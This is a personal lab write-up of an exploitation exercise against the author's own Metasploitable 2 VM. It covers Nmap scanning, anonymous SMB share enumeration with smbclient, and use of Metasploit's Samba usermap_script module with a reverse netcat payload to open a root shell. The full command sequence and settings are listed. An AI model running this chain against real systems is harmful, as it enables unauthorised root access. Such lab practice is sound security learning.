# Metasploitable 2 — Samba Enumeration & Exploitation

## Lab Overview

In this part of my Metasploitable 2 lab, I investigated the Samba/SMB service and successfully exploited a Samba vulnerability to obtain a root shell.

- Attacker: Kali Linux
- Target: Metasploitable 2
- Target IP: `192.168.29.48`
- Kali IP: `192.168.29.168`
- SMB ports: `139` and `445`
- Samba version found earlier: `3.0.20-Debian`

> **Lab safety:** This was performed against my own intentionally vulnerable Metasploitable 2 VM.

---

## 1. Starting Nmap Finding

My earlier Nmap scan identified:

```text
139/tcp  open  netbios-ssn  Samba smbd
445/tcp  open  netbios-ssn  Samba smbd 3.0.20-Debian
```

This made Samba an interesting service to investigate.

---

## 2. Target IP Changed

The Metasploitable 2 VM was later using:

```text
192.168.29.48
```

I first checked the SMB ports:

```bash
nmap -sV -p 139,445 192.168.29.48
```

Nmap reported that the host seemed down.

---

## 3. Try `-Pn`

I followed Nmap's suggestion:

```bash
nmap -Pn -sV -p 139,445 192.168.29.48
```

This showed:

```text
Host is up.

139/tcp filtered
445/tcp filtered
```

`filtered` means Nmap could not determine whether the ports were open or closed because something interfered with the probes.

---

## 4. Run a Normal Nmap Scan

I then ran:

```bash
nmap 192.168.29.48
```

This showed:

```text
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

The scan also showed many other Metasploitable services, including FTP, SSH, Telnet, HTTP, NFS, MySQL, PostgreSQL, IRC, and Tomcat.

The important finding for this lab was:

```text
139/tcp open
445/tcp open
```

---

## 5. Try SMB Share Enumeration

Since Samba provides SMB services, I used `smbclient`:

```bash
smbclient -L //192.168.29.48 -N
```

The first attempt timed out during protocol negotiation:

```text
Protocol negotiation (with timeout 20000 ms) timed out against server 192.168.29.48
```

I did not immediately exploit the service.

---

## 6. Test SMB with Nmap Scripts

I tried:

```bash
nmap -p 139,445 --script smb-protocols,smb-os-discovery 192.168.29.48
```

The result again confirmed:

```text
139/tcp open
445/tcp open
```

but did not provide additional useful SMB information.

---

## 7. Focused Version Detection

I then tried:

```bash
nmap -sV -p 139,445 192.168.29.48
```

Nmap returned:

```text
139/tcp open netbios-ssn?
445/tcp open microsoft-ds?
```

The `?` meant Nmap could not confidently identify the service during this particular scan.

However, my earlier full scan had identified:

```text
Samba 3.0.20-Debian
```

---

## 8. SMB Enumeration Worked

I tried the SMB enumeration command again:

```bash
smbclient -L //192.168.29.48 -N
```

This time it worked.

The server reported:

```text
Anonymous login successful
```

Shares discovered:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
```

It also reported:

```text
WORKGROUP
```

The important discovery was that SMB enumeration was possible anonymously.

---

## 9. Understand the Shares

The shares included:

- `print$`
- `tmp`
- `opt`
- `IPC$`
- `ADMIN$`

`Disk` shares represent file-sharing resources, while `IPC` shares are used for inter-process communication.

I decided to investigate `tmp`.

---

## 10. First Share Connection — Syntax Mistake

I initially typed paths with a space:

```bash
smbclient //192.168.29.48/ tmp -N
```

and similarly for `print$` and `opt`.

The correct SMB path format is:

```text
//IP/SHARE
```

There must be no space between `/` and the share name.

---

## 11. Test `opt`

I ran:

```bash
smbclient //192.168.29.48/opt -N
```

Result:

```text
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

This showed that anonymous authentication was accepted, but access to `opt` was denied.

---

## 12. Test `print$`

I ran:

```bash
smbclient //192.168.29.48/print$ -N
```

Result:

```text
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Again, authentication succeeded but share authorization was denied.

---

## 13. Connect to `tmp`

I ran:

```bash
smbclient //192.168.29.48/tmp -N
```

This worked:

```text
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

So the `tmp` share was accessible anonymously.

---

## 14. Enumerate `tmp`

At:

```text
smb: \>
```

I ran:

```text
ls
```

The share contained:

```text
.                                   D        0
..                                 DR        0
.ICE-unix                          DH        0
4512.jsvc_up                        R        0
.X11-unix                          DH        0
.X0-lock                           HR       11
```

I also ran:

```text
pwd
```

which returned:

```text
Current directory is \192.168.29.48	mp```

This confirmed I was working inside the remote `tmp` share.

---

## 15. Mistake — Linux Commands Inside `smbclient`

I tried:

```text
id
```

and:

```text
whoami
```

inside:

```text
smb: \>
```

The client returned:

```text
id: command not found
whoami: command not found
```

The reason is that `smbclient` is not a Linux shell.

The prompt tells me what environment I am in:

```text
smb: \>              → SMB client
root@metasploitable:/# → Linux shell
```

---

# 16. Search Metasploit for the Samba Version

At this point I moved toward vulnerability identification.

I started Metasploit:

```bash
msfconsole
```

Then searched for the Samba version:

```text
search samba 3.0.20
```

Metasploit returned:

```text
0  exploit/multi/samba/usermap_script  2007-05-14  excellent  No
   Samba "username map script" Command Execution
```

This gave me a potential exploit module:

```text
exploit/multi/samba/usermap_script
```

---

## 17. Select the Module

I selected module `0`:

```text
use 0
```

Metasploit responded:

```text
[*] No payload configured, defaulting to cmd/unix/re
```

The prompt became:

```text
msf exploit(multi/samba/usermap_script) >
```

---

## 18. Check Module Options

I ran:

```text
show options
```

The module required:

```text
RHOSTS
RPORT 139
```

The selected payload was:

```text
cmd/unix/reverse_netcat
```

with:

```text
LHOST
LPORT 4444
```

---

## 19. Mistake — Wrong Target IP

The module initially showed:

```text
RHOSTS 198.168.29.48
```

But the actual target was:

```text
192.168.29.48
```

I had accidentally used `198` instead of `192`.

I attempted the exploit with the wrong target and received:

```text
Exploit failed [unreachable]
Rex::ConnectionTimeout
```

This taught me to verify the target IP before exploiting.

---

## 20. Correct Target Configuration

The correct addresses were:

```text
RHOSTS = 192.168.29.48
LHOST  = 192.168.29.168
```

The target port was:

```text
RPORT = 139
```

Conceptually:

```text
Kali
192.168.29.168:4444
        ↑
        │ reverse connection
        │
Metasploitable 2
192.168.29.48:139
```

---

## 21. Exploit the Samba Vulnerability

After correcting the target, I ran:

```text
exploit
```

Metasploit reported:

```text
[*] Started reverse TCP handler on 192.168.29.168:4444
[*] Command shell session 1 opened (192.168.29.168:4444 -> 192.168.29.48:59662)
```

This confirmed that the exploit successfully resulted in a command shell.

---

## 22. Create an Interactive Shell

I entered:

```text
shell
```

Metasploit searched for Python:

```text
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
```

It then found Bash:

```text
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
```

The shell became:

```text
root@metasploitable:/#
```

---

## 23. Verify the User

I ran:

```bash
whoami
```

Result:

```text
root
```

This showed that the shell was running as the root user.

---

## 24. List the Filesystem

I ran:

```bash
ls
```

The result included:

```text
bin
boot
cdrom
dev
eAsVCgYRv
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tEJvkyBO
tmp
usr
var
vmlinuz
```

I did not modify or delete anything.

---

## 25. Check Current Directory

I ran:

```bash
pwd
```

Result:

```text
/
```

So I was at the root of the filesystem.

---

## 26. Verify UID/GID

I ran:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root)
```

On Linux, UID `0` represents root.

Therefore:

```text
whoami → root
id     → uid=0(root)
```

confirmed root-level access.

---

# 27. Final Attack Chain

```text
Nmap scan
    ↓
139/445 discovered
    ↓
Samba identified
    ↓
Anonymous SMB enumeration
    ↓
Shares discovered
    ↓
tmp share accessible anonymously
    ↓
Samba 3.0.20 identified from earlier scan
    ↓
Metasploit search
    ↓
usermap_script module found
    ↓
RHOSTS corrected
    ↓
Exploit executed
    ↓
Command shell opened
    ↓
Python/Bash interactive shell
    ↓
whoami → root
    ↓
id → uid=0(root)
    ↓
ROOT ACCESS
```

---

# 28. Important Concepts I Learned

### SMB vs Samba

- **SMB** is the network file/resource sharing protocol.
- **Samba** is software that implements SMB services on Linux.
- **smbclient** is a client that can communicate with SMB servers.

Mental model:

```text
Samba = SMB server implementation
SMB = protocol
smbclient = SMB client
```

### SMB Ports

The target exposed:

```text
139/tcp
445/tcp
```

Port 445 is commonly used for SMB directly over TCP, while 139 is associated with SMB over NetBIOS.

### Authentication vs Authorization

This lab showed that:

```text
Anonymous login successful
```

does not necessarily mean every share can be accessed.

For example:

```text
opt
→ authentication successful
→ NT_STATUS_ACCESS_DENIED
```

while:

```text
tmp
→ authentication successful
→ share accessible
```

### RHOSTS vs LHOST

```text
RHOSTS = target
LHOST  = attacker/Kali
```

For this lab:

```text
RHOSTS = 192.168.29.48
LHOST  = 192.168.29.168
```

### Shell vs Meterpreter/Client Interfaces

Different prompts represent different environments:

```text
smb: \>                  → smbclient
msf exploit(...) >      → Metasploit
meterpreter >           → Meterpreter
root@metasploitable:/#  → Linux shell
```

Understanding the current prompt prevents mistakes such as running `whoami` inside `smbclient`.

---

# 29. Mistakes I Made

### Mistake 1 — `filtered` result

I initially saw:

```text
139 filtered
445 filtered
```

but later a normal scan showed both ports open. I learned to investigate unexpected network results instead of immediately assuming the service was unavailable.

### Mistake 2 — SMB path syntax

I used:

```text
//192.168.29.48/ tmp
```

instead of:

```text
//192.168.29.48/tmp
```

### Mistake 3 — Linux commands inside `smbclient`

I ran:

```text
id
whoami
```

inside:

```text
smb: \>
```

Those commands belong to the Linux shell.

### Mistake 4 — Wrong RHOSTS

I accidentally used:

```text
198.168.29.48
```

instead of:

```text
192.168.29.48
```

This caused the Metasploit connection timeout.

---

# 30. Commands Used

## Nmap

```bash
nmap -sV -p 139,445 192.168.29.48
nmap -Pn -sV -p 139,445 192.168.29.48
nmap 192.168.29.48
nmap -p 139,445 --script smb-protocols,smb-os-discovery 192.168.29.48
nmap -sV -p 139,445 192.168.29.48
```

## SMB

```bash
smbclient -L //192.168.29.48 -N
smbclient //192.168.29.48/opt -N
smbclient //192.168.29.48/print$ -N
smbclient //192.168.29.48/tmp -N
```

Inside the `tmp` share:

```text
ls
pwd
id
whoami
```

## Metasploit

```bash
msfconsole
```

```text
search samba 3.0.20
use 0
show options
exploit
shell
```

## Linux shell

```bash
whoami
ls
pwd
id
```

---

# Final Result

| Item | Result |
|---|---|
| Target | Metasploitable 2 |
| Target IP | `192.168.29.48` |
| Kali IP | `192.168.29.168` |
| SMB Ports | `139`, `445` |
| Samba Version | `3.0.20-Debian` |
| Anonymous SMB Enumeration | Successful |
| Accessible Share | `tmp` |
| Metasploit Module | `exploit/multi/samba/usermap_script` |
| Session | Command shell |
| Final User | `root` |
| UID | `0` |
| Result | **Root-level command execution** |

## What I Practiced

This lab helped me practice:

**Reconnaissance → Enumeration → Troubleshooting → Service identification → Vulnerability research → Metasploit configuration → Exploitation → Shell → Privilege verification → Documentation**

The main lesson was to understand **why each step is performed**, rather than simply copying an exploit command.
